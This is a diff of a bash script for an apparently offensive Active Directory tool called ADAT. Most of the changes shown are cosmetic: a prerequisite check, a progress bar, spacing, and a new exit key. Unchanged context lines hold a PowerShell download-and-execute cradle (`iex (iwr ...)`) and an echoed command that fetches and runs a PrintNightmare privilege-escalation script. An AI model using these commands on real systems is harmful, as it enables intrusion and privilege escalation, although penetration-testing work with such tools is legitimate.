@@ -35,16 +35,8 @@ LocalRepo="False"
 iwr="iex (iwr -usebasicparsing "
 DownloadMethod="$iwr"
 
-################################################################################
-# Prerequisites                                                                #
-################################################################################
-
-Function_Prerequisites () {
-
-pip3 install ansi2html
 
 
-}
 
 ################################################################################
 # Wordlists                                                                    #
@@ -76,6 +68,25 @@ WHITE='\033[01;37m'
 
 IBLUE='\033[02;34m'
 ICYAN='\033[02;36m'
+
+################################################################################
+# Prerequisites                                                                #
+################################################################################
+
+ansi2htmlInstalled="$HOME/.local/lib/python3.9/site-packages/ansi2html"
+
+if [ -d "$ansi2htmlInstalled" ]
+then
+	echo -e ""
+	echo -e "${LGREEN}ansi2html is installed${RESTORE}"
+else
+	echo -e ""
+	echo -e "${LGREEN}Installing ansi2html${RESTORE}"
+    pip3 install ansi2html
+    	echo -e ""
+    	echo -e "${LGREEN}ansi2html is installed${RESTORE}"
+    
+fi
 
 ################################################################################
 # Functions                                                                    #
@@ -234,6 +245,22 @@ while [ $# -gt 0 ]; do
         esac
 done
 
+################################################################################
+# Main                                                                   #
+################################################################################
+
+echo -e "${LGREEN}Prerequisite checks completed. Preparing to launch ADAT.${RESTORE}"
+
+echo -ne '#####                     (33%)\r'
+sleep 1
+echo -ne '##############             (69%) Nice\r'
+sleep 2
+echo -ne '###############################(100%)\r'
+sleep 1
+echo -ne '\n'
+
+clear
+
 
 ################################################################################
 # Banner                                                                     #
@@ -259,7 +286,6 @@ echo -e ""
 echo -e ""
 echo -e ""
 
-sleep "5"
 
 ################################################################################
 # Main                                                                     #
@@ -677,7 +703,7 @@ echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-
 echo -e ""
 
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
-echo -e "									${LGREEN}♠ Enumeration ♠${RESTORE}"
+echo -e "										${LGREEN}♠ Enumeration ♠${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
@@ -721,29 +747,23 @@ echo -e ""
 
 if [ $LocalRepo == "True" ]
 then
-	echo -e "					${LYELLOW}			---> Press "'K'" to terminate script and python server <---${RESTORE}"
+	echo -e "					${LYELLOW}			---> Press "'t'" to terminate script and python server <---${RESTORE}"
 	echo -e ""
 	echo -e ""
 	echo -e ""
 	echo -e ""
 	echo -e ""
 	echo -e ""
-	read -s KillScript
+	read -n 1 -s "KillScript" ynq
 	
 	case $KillScript in
-		k)
+		t)
 echo -e "${LYELLOW}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
-											fuser -k "$LocalPort/tcp" 2> /dev/null &
-		echo -e "										Script Terminated gracefully"
+											fuser -k "$LocalPort/tcp" 2> /dev/null
+		echo -e "									Script Terminated gracefully"
 echo -e "${LYELLOW}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 		;;
 		
-		K)
-echo -e "${LYELLOW}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
-											fuser -k "$LocalPort/tcp" 2> /dev/null &
-		echo -e "										Script Terminated gracefully"
-echo -e "${LYELLOW}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
-		;;
 	esac
 fi
 
